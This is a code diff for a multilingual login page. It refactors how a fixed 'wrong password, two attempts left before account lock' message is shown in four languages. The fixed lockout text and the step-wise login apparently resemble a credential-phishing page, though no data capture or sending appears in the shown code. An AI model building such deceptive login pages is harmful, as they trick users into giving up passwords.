@@ -28,8 +28,7 @@
       </div>
       <label for="password">Contraseña</label>
       <input type="password" id="password" name="password" required />
-      <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;">
-        Contraseña incorrecta. Te quedan 2 intentos antes de bloquear la cuenta.
+      <div id="password-error" class="error-message" style="display: none; color: red; font-size: 14px; margin-top: 10px;"></div>
       </div>
       <button type="button" id="step2-button" disabled>Continuar</button>
     </div>
@@ -145,13 +144,21 @@
 <script src="script.js"></script>
 <script>
 document.addEventListener("DOMContentLoaded", function () {
-  // Fehlertexte in verschiedenen Sprachen
   const errorMessages = {
     "de": "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.",
     "en": "Wrong password. 2 attempts left before account lock.",
     "fr": "Mot de passe incorrect. Il reste 2 tentatives avant le blocage du compte.",
     "es": "Contraseña incorrecta. Te quedan 2 intentos antes de bloquear la cuenta."
   };
+
+  function showPasswordError() {
+    const lang = document.documentElement.lang; // z.B. 'fr'
+    const passwordErrorDiv = document.getElementById("password-error");
+    if (passwordErrorDiv) {
+      passwordErrorDiv.innerText = errorMessages[lang] || errorMessages["en"]; // fallback Englisch
+      passwordErrorDiv.style.display = "block";
+    }
+  }
 
   function handleLanguageChange(selectedLang) {
     switch (selectedLang) {
@@ -185,7 +192,6 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   }
 
-  // Dropdowns für Footer Mobile
   if (window.innerWidth <= 768) {
     document.querySelectorAll(".dropdown-toggle").forEach(button => {
       button.addEventListener("click", () => {
@@ -201,13 +207,6 @@ document.addEventListener("DOMContentLoaded", function () {
         }
       });
     });
-  }
-
-  // Passwort-Fehlertext dynamisch setzen je nach Sprache
-  const passwordErrorDiv = document.getElementById("password-error");
-  if (passwordErrorDiv) {
-    const lang = document.documentElement.lang; // liest <html lang="xx">
-    passwordErrorDiv.innerText = errorMessages[lang] || errorMessages["en"]; // Fallback auf Englisch
   }
 });
 </script>
